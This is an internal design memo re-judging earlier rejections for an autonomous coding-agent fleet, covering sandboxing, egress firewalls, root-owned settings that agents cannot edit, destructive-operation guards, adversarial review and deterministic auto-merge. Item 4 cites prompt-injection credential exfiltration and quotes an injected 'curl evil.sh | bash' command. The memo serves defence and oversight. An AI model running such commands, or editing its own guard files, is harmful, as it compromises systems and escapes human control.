# Kill-List Attack — §F REJECT-AS-LITERAL, re-asked under the new charter

**Question:** For each rejection the conservative synthesis made in §F, was the rejection *right* (the failure mode survives even at world-class fleet scale), or was it *conservative bias* (the rejection rested on a now-retired premise — solo scale, deferred autonomy, no durable cloud substrate)?

**Method:** Each item re-asked against the charter's two pivots — (1) autonomy is first-class, which changes the threat model (an unattended agent processes attacker-controllable input with no human backstop), and (2) scale = fleet across 5+ repos, which retires every "too much for a solo dev / hasn't bitten us" rejection. Verdicts cited to specific re-mine files. Per the §9 golden rule, every KILL-UPHELD names the precise failure mode the rejection still prevents.

**Verdict vocabulary:**
- **KILL-UPHELD** — the rejection survives at world-class fleet scale; the literal form stays dead and nothing is resurrected.
- **KILL-OVERTURNED** — the rejection was conservative bias; resurrect it, cite the re-mine, state its world-class form.
- **PARTIAL** — the *literal* form stays rejected, but a re-scoped form is in (e.g. container-escape no, OS-egress-firewall yes).

---

## Verdict table

| # | Rejection (conservative kept it dead) | Verdict | One-line ratio |
|---|---|---|---|
| 1 | Front-load trigger-words / shrink root to 200 lines | **KILL-UPHELD** | Both are anti-patterns at fleet scale; the §9 failure mode (demote no-trigger safety content) gets *worse* unattended. |
| 2 | Build `learned-patterns.md` (the file) | **PARTIAL** | The *file as the article framed it* stays a phantom; the **read-path + enforced excuse→action table** is resurrected. |
| 3 | Import the ROI/recall rates (80%, 1,300/wk, 16.6%, 91%…) | **PARTIAL** | Importing rates as *targets* stays dead; the numbers return as **calibration inputs / upper bounds** and the *mechanisms* are all elevated. |
| 4 | Dev-container/VM/microVM/gVisor/token-proxy stack | **PARTIAL** | Container-escape model stays dead; **OS-egress-firewall + managed-settings floor + destructive-op guard + cloud-sandbox routing** are all in. |
| 5 | "No shared context" for the adversarial reviewer | **KILL-UPHELD** (and the *correct* design is elevated) | Pure no-context blinds it to Rejected Patterns/ADRs; **shared canon, isolated solution context** is right and is now in-scope. |
| 6 | Collapse 23 agents → skills / "hundreds→one" | **KILL-UPHELD** | The universal threshold claim stays dead; at ~8–23 specialists are clarity (charter: "fewer files = red flag" RETIRED). |
| 7 | Symlink-live install | **PARTIAL** | Symlink-deployer (resolves to HEAD, second source of truth) stays dead; **versioned plugin + marketplace + lock** is the world-class form. |
| 8 | Agent pastes autoMode block into settings.json | **PARTIAL** | The agent-self-edit of a guard file stays forbidden; the **autoMode content + /init materializer + pre-flight gate** are massively elevated. |
| 9 | The grab-bag (Playwright, self-verify, /cr-feature, /change, auto-merge, demo-velocity, CLI-first, cost-margin, "frameworks evil") | **SPLIT** | Six sub-rejections UPHELD; **three (Playwright headless, spec-with-self-verification reframed, deterministic auto-merge) OVERTURNED**. |

**Tally:** overturned-or-promoted (the rejection was wrong, in whole or in the re-scoped part) = **6** (items 2, 3, 4, 7, 8, and the OVERTURNED slice of 9). Fully upheld (rejection survives whole) = **3** (items 1, 5, 6).

---

## Item-by-item reasoning

### 1. Front-load trigger-words / shrink root to 200 lines — **KILL-UPHELD**

Two distinct rejections, both survive.

- **Trigger-words:** `commands-vs-skills.md:17–23` is explicit — the article's own "front-load trigger-words" Standing Rule *is* the §9 anti-pattern, and the re-mine **keeps the rejection** ("keep the correction exactly"), replacing it with **situational triggers**. The charter does not rehabilitate keyword-soup; it makes situational triggering *more* load-bearing ("a fleet of agents matching against keyword soup will mis-route at volume"). So the rejection of the *literal* front-load-trigger-words instruction is upheld, and its correct replacement (situational) is elevated in *rank* — but that is a re-rank of the thing the conservative pass already adopted, not a resurrection of what it killed.
- **200-line target:** `commands-vs-skills.md:31` upholds the cut verbatim with a precise, fleet-amplified failure mode: **blindly shrinking the root demotes no-trigger safety content (destructive-op rules) into a tier that only loads on description-match — so it never loads at the exact moment an unprompted destructive command arrives.** That failure is *worse* across a parallel fleet running scheduled cloud jobs. "The conservative treatment here was rigor, not timidity."

Failure mode justifying the kill (per §9): a line-count diet that demotes the unprompted-destructive-command guard into match-only tiers is the PocketOS-class hole, unconditionally present is the requirement. **Upheld.**

### 2. Build `learned-patterns.md` — **PARTIAL** (phantom file stays dead; read-path + enforced table resurrected)

The conservative call that the *file* is a phantom is confirmed three times: `code-review-latentspace.md:36–37` ("do NOT build a new `learned-patterns.md` file — that is a §6 phantom and would duplicate `docs/solutions/` + `RECURRING-FINDINGS.md`"); `packmind.md:10` lists `learned-patterns.md` among fiction refs `/scan-context` should *catch and delete*. So the literal "go create the file the articles named" stays rejected — building it would duplicate existing stores.

But two re-scoped forms are in, and the conservative synthesis under-built both:
- **The read-path** (`code-review-latentspace.md:35–39`): RECURRING-FINDINGS.md is write-only — "auto-counted by `/cr` Step 3b, **never read by implementers**." Close the loop: load recurring findings into the *implementer's task-start context*, decay by recurrence (90-day → collapse), measure first-pass approval. Bitloops' 87–100%-over-8-weeks is the proof. This is the self-improvement primitive, elevated.
- **The enforced excuse→action table** (`osmani-agent-skills.md:11–12`): the value is not the prose (the model knows the excuses) but "a machine-greppable shape that survives in a file and gets enforced by something other than the model's goodwill" — a `/cr` pass that fails if a logged anti-pattern signature appears in the diff *or the agent's own justification text*. Our own memory records exactly this failure class repeatedly (`feedback_sentinel_bypass`, `feedback_pipeline_steps_not_skippable`).

So: the file-as-named stays a phantom; the **mechanism it gestured at** (read-back + decay + enforcer) is resurrected and elevated. Clean PARTIAL.

### 3. Import the ROI/recall rates — **PARTIAL** (rates-as-targets dead; rates-as-calibration-inputs in, mechanisms all elevated)

The principle "adopt mechanisms never rates" is *upheld* and is in fact sharpened by the re-mine, not overturned. `recursive-self-improvement.md:33–39` takes the most-cited number (16.6% AI-suggestion adoption, >50% of un-adopted wrong) and explicitly does **not** import it as a target — it uses it as a **ranking input that says "assume internal recall numbers are an upper bound, size the human/CI net accordingly,"** and warns that a friendly-only golden set "produces a recall number that is optimistic by construction." That is the opposite of importing the rate as a goal.

What *is* overturned is the conservative *demotion of the mechanisms the rates were attached to*:
- Stripe's 1,300 PRs/wk → the **Slack/automated-system trigger** is elevated to the north star (`stripe-minions-kaliski.md:43–54`), and the 2-retry ceiling → a **bounded-loop contract** (`agentic-platform-eng-saul.md:11–17`).
- Gemini CLI's 43%→91% → the **iterative adversarial loop** is the highest-leverage evidenced move (`code-review-latentspace.md:19–23`).
- Bitloops' 87–100% → the **compounding read-path** (item 2).
- The recall numbers themselves → motivate building a **standing calibration suite** (`recursive-self-improvement.md:17–23`), not importing anyone's number.

So the rejection "don't import the rates" survives as stated; the conservative *side-effect* of letting the rate-skepticism bury the mechanisms is the bias, and those mechanisms are resurrected. PARTIAL.

### 4. Dev-container/VM/microVM/gVisor/token-proxy stack — **PARTIAL** (container-escape model dead; egress-firewall + managed-settings + destructive-op floor + cloud-sandbox routing all in)

This is the item the charter most directly re-opens, and the evidence is unambiguous and consistent across three sources. The conservative claim "container-escape caused none of the documented incidents" is **factually correct and survives** — `agent-sandboxing-10co.md:11` confirms Anthropic's red-team got credential exfiltration in 24/25 prompt-injection attempts with **no container escape needed**. So the literal microVM/gVisor/container-escape threat model stays rejected; building Firecracker isolation to stop key-exfil is solving the wrong problem ("a Firecracker microVM with the service-role key inside it leaks the key exactly as a bare process does").

But the re-mine demolishes the conservative *conclusion* ("residue = allowlist operations not destinations") on four counts, because autonomy changes which failure modes are reachable unattended:

1. **OS-egress-firewall — OVERTURNED to in-scope-now.** `claude-dev-containers.md:13–19` and `agent-sandboxing-10co.md:25–31`: the egress allowlist is "the only control that survives a compromised agent" against the prompt-injection supply-chain class (an injected `curl evil.sh | bash` is code-compromise, not key-leak — credential-hiding does nothing). The conservative deferral rested on "maintenance difficult for a solo dev" — struck by the charter — and on "the laptop's network is the agent's network," which is now false: **cloud `/schedule` runs on restricted-network Anthropic infra by default**, so the egress primitive *already partially exists for the autonomous path* and the gap is the *local* `/queue` path. Pass-2 ranked it Tier-1; pass-3 walked it back on solo economics the charter retires.
2. **Managed-settings.json floor — OVERTURNED to in-scope-now.** `claude-dev-containers.md:21–27`: a root-owned `/etc/claude-code/managed-settings.json` is "a constraint the agent cannot circumvent" vs "a rule the agent is asked to follow." This is the same doctrine as `disable-model-invocation:true`, one OS layer down — and it is "the *defining* attack on a self-improving loop (an agent that can edit its own constraints is an agent with no constraints)." For the *cloud* tier the image is built fresh each run, so the host-precedence uncertainty disappears entirely. (Note: per `feedback_no_agent_edits_guard_files`, *placing* this file is itself a human handoff — see item 8.)
3. **Destructive-op floor (the absent 3rd guard) — OVERTURNED to in-scope-now.** `agent-sandboxing-10co.md:17–23`: the literal Replit-July-2025 prod-DB-delete and the literal PocketOS-2026 incident. The charter says the machine runs while the laptop is closed — "precisely when no human is present to catch a `DROP TABLE`." Build `block-dangerous-bash.sh` at full scope (deploys + destructive SQL + boundary `rm`).
4. **Per-agent isolation principle — OVERTURNED, but realized through cloud-sandbox routing, NOT local DinD.** `claude-dev-containers.md:29–35`: elevate the *principle* (cross-agent credential reads on a shared host are a real lateral-movement surface at fleet scale) but **uphold the cut of the local DinD dev-container** — the right vehicle is the cloud `/schedule` sandbox the charter confirms, not a hand-rolled local container.

Plus the migration-credential resolution (`agent-sandboxing-10co.md:33–39`): agent verifies locally, human applies to prod, guard blocks `supabase db push` against a non-local target. This closes the one legitimate-looking reason to put the prod key back in the box.

So: container-escape / microVM / gVisor / DinD-for-the-test-stack stays rejected (wrong threat model, named: those defend against an exploit that caused zero incidents). Egress-firewall + managed-settings + destructive-op floor + cloud-sandbox routing + per-worktree prod-credential scoping are all resurrected to in-scope-now. The conservative residue ("allowlist operations not destinations") was *half the answer* — operations-allowlist (the destructive-op guard) AND destinations-allowlist (the egress firewall) are both load-bearing. **PARTIAL, leaning heavily overturned.**

### 5. "No shared context" for the adversarial reviewer — **KILL-UPHELD** (and the correct design is elevated)

The rejection is correct and the re-mine states the exact reason: `code-review-latentspace.md:19` — "pure 'no shared context' would also blind the reviewer to our Rejected Patterns and project canon, which is exactly what makes `/cr` good." So the literal "give the reviewer no shared context" stays dead, with a named failure mode: a reviewer stripped of canon re-litigates settled Rejected Patterns and ADRs and misses tenant/RLS rules that live in `src/data/`, not the diff.

The *correct* design — **shared project canon, isolated solution context** — is what the conservative synthesis already named but buried as a fact-check; the re-mine elevates it (`code-review-latentspace.md:20–23`): a fresh sub-agent that does NOT see the coding session's reasoning/justifications/edit-chain but DOES read CLAUDE.md/AGENTS.md/Rejected-Patterns/PITFALLS/ADRs, framed "find what breaks this," run as the 3–4 round hunt→fix→retest loop that produced Gemini's 43%→91%. That elevation is captured under item 9's OVERTURNED slice and item 3's mechanism-elevation. The §F rejection *as worded* ("no shared context") stays killed. **Upheld.**

### 6. Collapse 23 agents → skills / "hundreds→one" — **KILL-UPHELD**

The charter itself is the strongest argument for upholding: "CLARITY BEATS MINIMALISM… 'Fewer files = red flag' is RETIRED." A blanket "collapse N specialists into one" is the minimalism reflex the charter explicitly kills. The re-mine corpus nowhere argues for collapsing the specialist agents; the recurring move is the *opposite* — add the missing specialist mechanisms (a project-owned `/verify` distinct from `/debug`, `playwright-mcp-debug.md:17–22`; "more skills is fine when each earns its place"; the sub-agent adversarial reviewer of item 5). The "hundreds→one" threshold claim is sold as universal but is a context-window argument from a different scale; at ~8–23 specialists with sharp situational descriptions, separation *is* the clarity, and each agent earns its place by owning a distinct loop with distinct economics (debug is unbounded/exploratory; verify is binary/deterministic — `playwright-mcp-debug.md:17`).

Failure mode justifying the kill (per §9): collapsing specialists into a generalist skill re-introduces the keyword-soup mis-routing of item 1 and erases the owning-layer signal the distribution manifest needs (`zapier-skillmd.md:23–24`, `osmani-agent-skills.md:43`) — i.e. it actively *harms* the fleet-scale routing the charter wants. The one honest nuance: agents that are empty stubs or duplicates of each other should be *cut for being phantoms* (the `/scan-context` drift sweep, `packmind.md:10`), but that is fiction-deletion, not a "collapse to one" doctrine. **Upheld.**

### 7. Symlink-live install — **PARTIAL** (symlink-deployer dead; versioned plugin + marketplace + lock is the form)

The conservative reasoning — symlink resolves to HEAD not a SHA — is correct *and* is independently confirmed as a packaging failure mode by the re-mine. `harness-engineering-survey.md:31–35` UPHELD-CUTs the exact thing item 7 names: Saul Fernandez's `agent-setup` = "symlink deployer," part of the three-repo architecture, and the named failure mode is **manifest-drift across N adapter folders / a second source of truth that drifts** (pass2-D). `agentic-platform-eng-saul.md:5` confirms the prescription is "three-repo layout wired together with **symlinks**" — explicitly the solo-dev packaging the re-mine rejects.

The world-class form is the charter's resolved fact, and the re-mine states it precisely: `commands-vs-skills.md:35` — a plugin is "**version-pinned and `/plugin update`-able**, so the behavioral harness travels as one released artifact and pulls fixes down," vs the symlink/template-copy that "silently diverge[s] and nothing updates them." So: symlink-live (HEAD-tracking, drift-prone, second source of truth) stays rejected; **versioned-copy-with-lock via plugin+marketplace** is resurrected as the distribution spine (this is the same conclusion item 8 and the manifest move converge on). The conservative *rejection of symlink* is upheld as stated; the bias was the conservative *lean toward the GitHub-template-repo vehicle over the plugin* (`commands-vs-skills.md:38–39`), which the charter overturns. PARTIAL.

### 8. Agent pastes autoMode block into settings.json — **PARTIAL** (agent-self-edit forbidden; the content + materializer + gate elevated)

The forbidden *action* stays forbidden, and the re-mine itself encodes the rule: `zapier-skillmd.md:17` — "**guard-file edits and settings.json changes are a human handoff — surface paste-ready content, do not self-apply.**" This matches the standing memory `feedback_no_agent_edits_guard_files`. So an agent writing the autoMode block into `settings.json` itself is correctly rejected and that rejection survives at any scale (a self-improving agent that can edit the policy file governing its own autonomy has no policy floor — the same logic as the managed-settings floor in item 4).

What the conservative synthesis got wrong is collapsing the *whole autoMode topic* into "a mechanical wiring tweak" and thereby dropping the substance. `auto-mode-config.md` elevates three things the agent must *prepare* (and a human installs): (1) the autoMode policy placed where the classifier reads it, proven via `claude auto-mode config` (`:16–17`); (2) a **pre-flight verification gate** that compiles the un-typed prose policy before every unattended launch (`:23–27`); (3) a **committed canonical source + per-repo `/init` materializer** so the policy distributes across the 5+ repo fleet instead of being hand-pasted tribal knowledge (`:31–35`). The charter's "plugin can't carry permissions → thin `/init` template" resolves the storage-vs-distribution fork option (b).

So: the *agent self-applying the block* stays a clean human-handoff (rejection upheld); the **autoMode pillar** (content authored by the agent, materialized by `/init`, verified by a pre-flight gate, installed by a human) is resurrected from "wiring tweak" to a first-class autonomy substrate. PARTIAL — and the way the re-mine threads it (agent surfaces paste-ready content + a materializer the human runs) is precisely how you get the elevated content without violating the no-self-edit rule.

### 9. The grab-bag — **SPLIT: 6 UPHELD, 3 OVERTURNED**

This item bundles nine unlike things; they do not share a verdict.

**UPHELD (6) — the rejection survives, named failure mode each:**
- **`/cr-feature` (retired):** it is retired in canon and still phantom-referenced (`packmind.md:10` lists it as a staleness drift `/scan-context` should delete). Reviving a retired skill is fiction; cut stays. Failure mode: phantom skill refs are exactly the drift the manifest/scan exists to kill.
- **`/change` (phantom):** never built; same fiction-deletion logic. Cut stays.
- **auto-merge-on-a-model-confidence-score:** UPHELD. Auto-merge IS overturned (below) — but the *confidence-score* trigger is the authority-laundering failure: a model grading its own diff "confident enough to merge" is `recursive-self-improvement.md`'s exact disease ("the thing being graded computes its own passing grade"). The trigger must be **deterministic** (paths/diff-size/test-delta/CI-green), never a model confidence number. The model-score form stays dead.
- **demo-velocity metric:** UPHELD. `code-review-latentspace.md:41–47` elevates *effectiveness* metrics (first-pass-approval-rate, cycle-count, post-merge-defect attribution) — falsifiable quality signals — explicitly *against* vanity throughput. Demo-velocity is a vanity metric with no named failure mode it prevents; cut stays.
- **CLI-first-for-everything:** UPHELD. `stripe-minions-kaliski.md:153–174` (the "fork, don't build" / moat-question move) is an UPHELD-CUT of unfalsifiable decision rules; "CLI-first for everything" is the same shape — a universal prescription, not a failure-mode-justified rule. The charter's own "build what's needed now" cuts the absolutism. Cut stays.
- **cost-margin gates / "our economics differ":** UPHELD as a *cut of the rejection-reason*. The charter is explicit: "'too much for a solo dev / our economics differ' is NOT a valid rejection." So a *cost-margin gate used to reject autonomy features* stays dead. (A *budget/iteration cap inside a loop* is different and is elevated — `agentic-platform-eng-saul.md:11–17` — but that is the bounded-loop contract, not a cost-margin gate on whether to build.)
- **"frameworks are evil":** UPHELD. A blanket anti-framework stance has no named failure mode; the charter's "more files/skills/hooks is fine when each earns its place" directly contradicts it. Cut stays.

**OVERTURNED (3) — conservative bias, resurrect:**
- **Playwright MCP — OVERTURNED.** `playwright-mcp-debug.md:31–36`: the `.claude/mcp.md` "Playwright redundant with chrome-devtools-mcp" rejection judged redundancy on *signal overlap*, but the deciding axis under autonomy is *attended-vs-unattended*: chrome-devtools-mcp is **headed-only** ("breaks in CI, overnight runs, headless"), so the unattended verification leg the charter centers is *structurally impossible* without a headless path. Keep chrome-devtools-mcp for attended deep debugging; **add headless Playwright (or a CI browser job against a preview deploy) for unattended runs.** The redundancy claim was solo/attended bias.
- **Spec-with-implementer-self-verification — OVERTURNED in re-scoped form.** The naive "let the implementer certify its own work" is correctly suspect (authority laundering). But the *real* move the conservative pass killed is the **artifact-producing verification gate**: `playwright-mcp-debug.md:10–15` — the agent's "done" must ship as an **independently-checkable artifact** (a11y snapshot + console + pixel-diff vs baseline) that reaches CI, gated by `disable-model-invocation` so the agent "can neither fabricate nor skip it," plus a fail-closed tenant-assertion (`playwright-mcp-debug.md:38–43`). That is self-verification *bound to an external oracle* — the opposite of self-certification. Resurrect the artifact-gate form.
- **Auto-merge-on-confidence — the *deterministic* auto-merge is OVERTURNED.** `code-review-latentspace.md:25–31`: Ona's deterministic risk-based auto-approval (paths + diff-size + test-delta + scope; independent operator, 74% lead-time reduction) is "arguably the most charter-aligned move in the source and the conservative synthesis left it on the floor as commentary." It takes most PRs out of the human path *without* a model judgment in the merge decision (safe under `disable-model-invocation`). So: model-confidence-score auto-merge stays dead (above); **deterministic risk-classified auto-merge with conservative LOW-risk thresholds (CI-green + `/cr`-clean + in-scope + positive-test-delta simultaneously) is resurrected** — for a $30k-client tool the threshold is conservative, but that tunes the gate, it does not reject the mechanism.

---

## The one-paragraph synthesis

The conservative §F was *right* on the three items where the failure mode is the model grading or editing itself, or a universal prescription with no named failure (1, 5, 6 — and the model-score / vanity / absolutist slices of 9). It was *wrong* — conservative bias resting on retired premises — on the items where autonomy changes which failure modes are reachable unattended. The single most-suppressed cut is **item 4**: the synthesis correctly rejected the container-escape threat model and then over-generalized that into rejecting the egress firewall, the managed-settings floor, and the destructive-op guard — three controls that operate *below* a compromised agent's reasoning, which is exactly the layer that matters once a human is no longer in the loop and the laptop is closed. The charter's resolved fact (cloud `/schedule` runs on restricted-network Anthropic infra) doesn't moot the sandbox question — it *proves the sandbox primitive is correct* by shipping it for the cloud path, leaving the local `/queue` path as the actual gap. World-class autonomous harnesses build the cage *for the autonomous car they are about to switch on*, not after the incident.
